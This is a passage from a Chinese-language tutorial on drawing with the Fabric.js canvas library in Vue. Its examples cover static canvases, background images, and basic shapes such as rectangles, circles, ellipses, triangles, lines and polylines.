<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 使用 StaticCanvas 创建一个不可操作的画布</span>
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">StaticCanvas</span>(<span class="hljs-string">'canvas'</span>) <span class="hljs-comment">// 这里传入的是canvas元素的id</span>

  <span class="hljs-comment">// 创建一个长方形</span>
  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器顶部 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器左侧 100px</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 矩形宽度 30px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 矩形高度 30px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'red'</span> <span class="hljs-comment">// 填充 红色</span>
  })

  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>创建不可交互的画布，其实只需把 <code>new fabric.Canvas</code> 改成 <code>new fabric.StaticCanvas</code> 即可。</p>
<h3 data-id="heading-8">在js设定画布参数</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/878f68df0cb44952b80e3edbd44abd93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=PEORSzNcVQMavB1Bu895Sk7KV5Q%3D" alt="007.png" loading="lazy"/></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>, {
    <span class="hljs-attr">width</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">// 画布宽度</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>, <span class="hljs-comment">// 画布高度</span>
    <span class="hljs-attr">backgroundColor</span>: <span class="hljs-string">'#eee'</span> <span class="hljs-comment">// 画布背景色</span>
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-9">使用背景图</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// 设置背景图</span>
  <span class="hljs-comment">// 参数1：背景图资源（可以引入本地，也可以使用网络图）</span>
  <span class="hljs-comment">// 参数2：设置完背景图执行以下重新渲染canvas的操作，这样背景图就会展示出来了</span>
  canvas.<span class="hljs-title function_">setBackgroundImage</span>(
    <span class="hljs-string">'图片url'</span>,
    canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas)
  )
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-10">拉伸背景图</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-comment">// fabric.Image.fromURL：加载图片的api</span>
  <span class="hljs-comment">// 第一个参数：图片地址（可以是本地的，也可以是网络图）</span>
  <span class="hljs-comment">// 第二个参数：图片加载的回调函数</span>
  fabric.<span class="hljs-property">Image</span>.<span class="hljs-title function_">fromURL</span>(
    <span class="hljs-string">'图片url'</span>,
    <span class="hljs-function">(<span class="hljs-params">img</span>) =&gt;</span> {
      <span class="hljs-comment">// 设置背景图</span>
      canvas.<span class="hljs-title function_">setBackgroundImage</span>(
        img,
        canvas.<span class="hljs-property">renderAll</span>.<span class="hljs-title function_">bind</span>(canvas),
        {
          <span class="hljs-attr">scaleX</span>: canvas.<span class="hljs-property">width</span> / img.<span class="hljs-property">width</span>, <span class="hljs-comment">// 计算出图片要拉伸的宽度</span>
          <span class="hljs-attr">scaleY</span>: canvas.<span class="hljs-property">height</span> / img.<span class="hljs-property">height</span> <span class="hljs-comment">// 计算出图片要拉伸的高度</span>
        }
      )
    }
  )
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>这个例子使用了 <code>fabric.Image.fromURL</code> 这个 <code>api</code> 来加载图片，第一个参数是图片地址，第二个参数是回调函数。</p>
<p>拿到图片的参数和画布的宽高进行计算，从而使图片充满全屏。</p>
<h2 data-id="heading-11">基础图形</h2>
<h3 data-id="heading-12">矩形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7072f26826404a3c95cf5a3d441e6a6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=y0C1nTfu9W1vbvjxbJ8%2BRmmQqqE%3D" alt="015.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器顶部 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器左侧 100px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// 填充 橙色</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 宽度 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span> <span class="hljs-comment">// 高度 100px</span>
  })
  
  <span class="hljs-comment">// 将矩形添加到画布中</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Rect</code> 创建 <strong>矩形</strong>。</p>
<h3 data-id="heading-13">圆角矩形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d36214b8b0e4496910c2a16600bb3f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=2TUue1HTXRrxnZTotTbGTkfsP6Q%3D" alt="016.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Rect</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器顶部 100px</span>
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 距离容器左侧 100px</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'orange'</span>, <span class="hljs-comment">// 填充 橙色</span>
    <span class="hljs-attr">width</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 宽度 100px</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 高度 100px</span>
    <span class="hljs-attr">rx</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// x轴的半径</span>
    <span class="hljs-attr">ry</span>: <span class="hljs-number">20</span> <span class="hljs-comment">// y轴的半径</span>
  })
  
  <span class="hljs-comment">// 将矩形添加到画布中</span>
  canvas.<span class="hljs-title function_">add</span>(rect)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>画圆角矩形，需要添加 <code>rx</code> 和 <code>ry</code>。</p>
<h3 data-id="heading-14">圆形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df2c37a8fcf848fba3b808a4821fac17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=wGahQ1Tiqm%2Bs0jomz4zfqw9WWEQ%3D" alt="017.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> circle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Circle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">radius</span>: <span class="hljs-number">50</span>, <span class="hljs-comment">// 圆的半径 50</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'green'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(circle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Circle</code> 创建<strong>圆形</strong>。</p>
<p>圆形需要使用 <code>radius</code> 设置半径大小。</p>
<h3 data-id="heading-15">椭圆形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b48955164db04c8b9b7b6e011d5a6f33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=THOJkfXk4oED23XWz7xSl4Nt8zQ%3D" alt="018.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> ellipse = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Ellipse</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">20</span>,
    <span class="hljs-attr">rx</span>: <span class="hljs-number">70</span>,
    <span class="hljs-attr">ry</span>: <span class="hljs-number">30</span>,
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'hotpink'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(ellipse)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>需要使用 <code>new fabric.Ellipse</code> 创建 <strong>椭圆</strong>。</p>
<p>和圆形不同，椭圆不需要设置 <code>radius</code> ，但要设置 <code>rx</code> 和 <code>ry</code>。</p>
<ul>
<li>当 <code>rx</code> &gt; <code>ry</code> ：椭圆是横着的</li>
<li>当 <code>rx</code> &lt; <code>ry</code>：椭圆是竖着的</li>
<li>当 <code>rx</code> = <code>ry</code>： 看上去就是个圆形</li>
</ul>
<h3 data-id="heading-16">三角形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b40e25707b345f3bd6104fe665fb881~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=rRIDsix7FnQLb5E8%2FIEW7qLbAR8%3D" alt="019.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> triangle = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Triangle</span>({
    <span class="hljs-attr">top</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">left</span>: <span class="hljs-number">100</span>,
    <span class="hljs-attr">width</span>: <span class="hljs-number">80</span>, <span class="hljs-comment">// 底边长度</span>
    <span class="hljs-attr">height</span>: <span class="hljs-number">100</span>, <span class="hljs-comment">// 底边到对角的距离</span>
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'blue'</span>
  })
  canvas.<span class="hljs-title function_">add</span>(triangle)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Triangle</code> 创建三角形，三角形是需要给定 “底和高” 的。</p>
<h3 data-id="heading-17">线段</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d59d415f9bc4685b80648277c7481a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=2N6hmFUyyCVcSgFQJ66N2gWbOHE%3D" alt="020.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Line</span>(
    [
      <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-comment">// 起始点坐标</span>
      <span class="hljs-number">200</span>, <span class="hljs-number">300</span> <span class="hljs-comment">// 结束点坐标</span>
    ],
    {
      <span class="hljs-attr">stroke</span>: <span class="hljs-string">'red'</span>, <span class="hljs-comment">// 笔触颜色</span>
    }
  )
  canvas.<span class="hljs-title function_">add</span>(line)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Line</code> 创建线段。</p>
<p><code>new fabric.Line</code> 需要传入2个参数。</p>
<ul>
<li>
<p>第一个参数是 <strong>数组</strong> ，数组需要传4个值，<strong>前2个值是起始坐标的x和y，后2个值是结束坐标的x和y</strong>。</p>
</li>
<li>
<p>第二个参数是 <strong>线段的样式</strong>，要设置线段的颜色，需要使用 <code>stroke</code> 。</p>
</li>
</ul>
<h3 data-id="heading-18">折线</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b174ce0b9c5544d1b997029bd2094912~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=Set1FSW87bWpJ2s%2B6sDvV%2FHyXGI%3D" alt="021.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { fabric } <span class="hljs-keyword">from</span> <span class="hljs-string">'fabric'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> canvas = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Canvas</span>(<span class="hljs-string">'canvas'</span>)

  <span class="hljs-keyword">const</span> polyline = <span class="hljs-keyword">new</span> fabric.<span class="hljs-title class_">Polyline</span>([
    {<span class="hljs-attr">x</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">150</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">140</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">240</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">150</span>},
    {<span class="hljs-attr">x</span>: <span class="hljs-number">100</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">30</span>}
  ], {
    <span class="hljs-attr">fill</span>: <span class="hljs-string">'transparent'</span>, <span class="hljs-comment">// 如果画折线，需要填充透明</span>
    <span class="hljs-attr">stroke</span>: <span class="hljs-string">'#6639a6'</span>, <span class="hljs-comment">// 线段颜色：紫色</span>
    <span class="hljs-attr">strokeWidth</span>: <span class="hljs-number">5</span> <span class="hljs-comment">// 线段粗细 5</span>
  })
  canvas.<span class="hljs-title function_">add</span>(polyline)
}

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">init</span>()
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>使用 <code>new fabric.Polyline</code> 创建<strong>线段</strong> 。</p>
<p><code>new fabric.Polyline</code> 需要传入2个参数。</p>
<ul>
<li>第一个参数是数组，描述线段的每一个点</li>
<li>第二个参数用来描述线段样式</li>
</ul>
<p>需要注意的是， <code>fill</code> 设置成透明才会显示成线段，如果不设置，会默认填充黑色，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/103b44cf02b441b18d35f0e1b805a5e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=aOBb4dFmcCEZk4bJ5w6W9qaXnKE%3D" alt="022.png" loading="lazy"/></p>
<p>你也可以填充自己喜欢的颜色，<code>new fabric.Polyline</code> 是不会自动把 <strong>起始点</strong> 和 <strong>结束点</strong> 自动闭合起来的。</p>
<h3 data-id="heading-19">多边形</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/610b0cffd2924cae8814de8e877746dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHN4Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769073934&amp;x-signature=V5tgS%2FKwsKUOIOosuORFLxAdYJo%3D" alt="023.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"400"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"375"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"canvas"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"border: 1px solid #ccc;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
